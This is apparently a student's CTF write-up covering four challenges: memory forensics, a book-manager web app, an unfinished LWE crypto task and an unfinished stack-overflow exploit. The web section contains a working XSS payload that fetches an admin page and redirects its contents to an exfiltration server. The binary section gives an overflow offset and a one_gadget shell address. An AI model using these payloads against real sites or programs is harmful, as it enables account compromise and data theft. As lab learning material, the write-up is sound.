# Senior Task Phase 2 - Writeup



# 1. Gotham Hustle

> Gotham’s underbelly trembles as whispers spread—The Riddler’s back, leaving cryptic puzzles across the city’s darkest corners. Every clue is a trap, every answer another step into madness. Think you can outsmart him? Step into Gotham’s shadows and prove it. Let the Batman's Hustle get its recognition!

## Handout :
+ [Primary Link](https://drive.google.com/file/d/1fwqdgpXkEnZ2xgujGaRufmPht5H_3xrT/view?usp=sharing)

+ [Mirror Link](https://mega.nz/file/DAUTnBpK#OViMZVDawIEomCiFFl2qU4usAJLAnGXINN3EklggSAk)

`MD5 hash : c277f2cef257e7593cb6d262816af057`

`flag format : bi0sctf{...}`

## Solution:

- We were given a .RAW memory image file, to recover a 5 - part flag from it.

- At first, I used Disk Carving tool, PhotoRec to recover thousands of files from the file. Before this, I tired to use OSFMount to mount the raw file as a Disk to  access its contents, but that method didn't work out. It wouldn't mount and even if it did, the files were inaccessible. PhotoRec actually managed to recover a huge list of files, out of which i was able to recover two parts of the flag.

- First file was a zip file which was password protected, and bbecause of the challenge relevance I guessed the password to be batman, which open a text file called flag.txt, which uncovered this string "bTByM18xMzMzNzQzMX0=". which after decoding from base64 gave "m0r3_13337431}", which was part 5.

- Another file was an RTF file which opening trhough notepad had another hex String, "Ymkwc2N0Znt3M2xjMG0zXw==" which upon decoding was "bi0sctf{w3lc0m3_", which was part 1.

- And after a long time of searching and finding nothing I decided to use Volatility2 to look through pslist which gave a bunch of apps listed, such as notepad.exe, crhome.exe and mspaint.exe, etc.

- Looking through the dump of notepad.exe, I could seee another base64 under flag3 =  "aDBwM190aDE1Xw==" which translated to "h0p3_th15_", and was part 3.

- Loooking through chrome.exe's dump, there was part 4, "YjNuM2YxNzVfeTB1Xw==", which was "b3n3f175_y0u_".

- Part 2 of the flag was somehwere in mspaint.exe, since these were the ones that stood out the most. Found it to be "t0_df1r_l4b5", after takking an image from the dump and applying an offset. 


## Flag:

```
bi0sctf{w3lc0m3_t0_df1r_l4b5_h0p3_th15_b3n3f175_y0u_m0r3_13337431}
```

## Concepts learnt:

- Using OSFMount to mount disks
- PhotoRec to recover deleted/corrupted/formatted/lost files.
- Usage of Forensics tools like volatility2, and 3.


***

# 2. Web Exploitation - n6bwvr

> Make a solution script which auto exfiltrates the flag when admin visits a reported book. 
Provide walkthroughs on how you approached the challenge and found the parts to get the flag. 

> To build the app:
    docker built -t chal .

    To run:
    docker run -p 50001:1337 chal

    To visit a reported link as admin:
    Login with these credentials on separate browser:
    admin:admin
    Visit the share link. 
## Attachments:
- The python script used to exfiltrate data in this challenge is [here](scripts/script.py)
## Solution:

- Running the provided Docker container:

```
docker build -t chal .
docker run -p 50001:1337 chal
```

- The app suggests a web based book manager, in whih each user is pre assigned some books taken from initDb or startingData.json. 
- Inside the Docker container, checking:
``` 
/tmp/chalDBs/admin.db
SELECT * FROM BOOKS; (sqlite3)
```
- This entry seems to show where the flag lives:

- The Sound Of The Flag Whirling|Maddd Max|326||https://example.com?flag=nite{test_flag_stp}|0|0|QXfE_f29aw

- To find the vulnerability, I could notice that the title or the author field of each book doesn't undergo any sanitization/formatting and so it would be the perfect place to put the exploit in. 

- The procedure would be to first for one user to register and login and create a book with the title or the author as the exploit. Tehen a second user must also register and login and then report the book, since a given paramter in the files forbade a user to create and report the book themself. The book would be reported using its liteId during the time of creation.

- After this the admin must login in a different browser, who would then check the book, by opening the book through a service called liteshare. This would then trigger the exploit which would send the flag by extracting it from the admin's book's link and redirect to the exfiltration server.

- For the actual exploit itself, it is an image source using onerror commmand, since CSP blocks actual inline ```<script>``` tags. Initially I wanted the exploit to send the flag link to a webhook that I would have, but this deemed ineffective. Content Security Policy did however allow things to be exfiltrated through loading data with an image using DuckDuckGo. Could not use fetch() or XHR, becuase of CSP. The final payload looked like this:

```
<img src=x onerror="
    fetch('/view/admin/QXfE_f29aw')
      .then(r => r.text())
      .then(f => { location='http://localhost:8000?flag='+encodeURIComponent(f) })
">

```
- considering the actual files though, the Dockerfile had to be modified, and I had to build it with no cache, 

```
docker build --no-cache -t chal .
docker run -p 50001:1337 chal
```
- Also the internal bot that was supposed to automatically check the URL was commented out in main.js, this meant we had to physically login as admin and check the URL using liteshare.

- the flag was finally revealed since the XSS would fire after the page was loaded using liteShare, where it would redirect to the exfil server (in this case localhost:8000/flagurl), or otherwise in the payload could be put in the console to redirect it. 

- the python script, prints out any incoming requests to the exfiltration server, and the code has been attached.

## Flag:

```
__nite{test_flag_stp}__
```

## Concepts learnt:

- Docker commands, building and running apps 
- Web exploitation techniques



# 3. Cryptography (unfinished)

A filtermaze question by google ctf.
 

## Notes:

- This is a three stage solution to solve an LWE problem, (Learning with Errors).
- The first stage has us connect to HOST = "filtermaze.2025.ctfcompetition.com", in which you identify the maze path and error magnitudes of the problem, but to do this, a roof of work must be submitted. The python script for that can be found [here](scripts/step1_maze_and_error_pow.py).
 
- From here we now have 'error_magnitudes.json', which is used along with the ublic paramters to solve the LWE problem. The python script I used took so many iterations till 2 power 23 signed magnitudes that, it took too long to process and I was unable to retrieve the 'secret' of the LWE. The script is [here](scripts/step_solve_lwe.py). I also attempted to use OR tools made by Google, but this also deemed ineffective.

- If I had obtained the secret part, this can be solved by then taking the secret of the LWE, to do stage 3 in which we submit another proof of work, to retrieve the flag.

## Concepts learnt:

- Proof of Work concepts along with LWE concepts.
- Z3 Solver usage and OR tools usage.

# 4. Binary Exploitation (unfinished):

## Notes:

- In this challenge, I felt I was pretty close to retreiving the flag. The overall flow went like this:

- The challenge provided two files, main - the vulnerable 64-bit ELF binary and the Dockerfile, and the binary runs inside a jailed environment and dies quickly due to an internal alarm.
- The goal was to memory overflow the jail container and get the shell to read flag.txt.

- At first, I tried to build the docker image normally, but this was a nsjail container, as you could see in the Dockerfile provided called redpwn/jail. 

- I noticed that the server while listening on the port, while sending increasing payloads using nc, SIGSEV was reported when overflowing the stack at around 264 bytes.

- I extracted the exact libc using these commands:
```
docker cp <containerid>:/usr/lib/x86_64-linux-gnu/libc.so.6 .
docker cp <containerid>:/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 .
```

- using ``` one_gadget ./libc.so.6 ```, I found the viable gadget to use, ``` 0xef4ce  execve("/bin/sh", rbp-0x50, r12) ```. 
- ONE_GADGET_ADDR = LIBC_BASE + 0xef4ce and so using this command to find the LIBC_BASE of libc.so.6 as well as usage of GDB,
```
./ld-linux-x86-64.so.2 --library-path . ./main
gdb -q --args ./ld-linux-x86-64.so.2 --library-path . ./main
```
I found the LIBC_address to be, 0x7ffff7da8000. 

- Now the main concern was that this was all done, using ASLR turned off by me, because this becomes more of a complex problem if ASLR was turned on since the memory addresses would change each time we would try to send a memory overflow payload.

- Upon installing python3 and pip3 in a virtual environment, I tried to run the program [here](scripts/solve.py) to get back the flag, and using the command cat flag.txt to retrieve it. But it didn't work, I would EOF while swtiching to Interactive mode.

[Files used in the challenge](scripts/bin_expl)

## Concepts Learned:

- ASLR concepts
- New docker concepts using jail container.
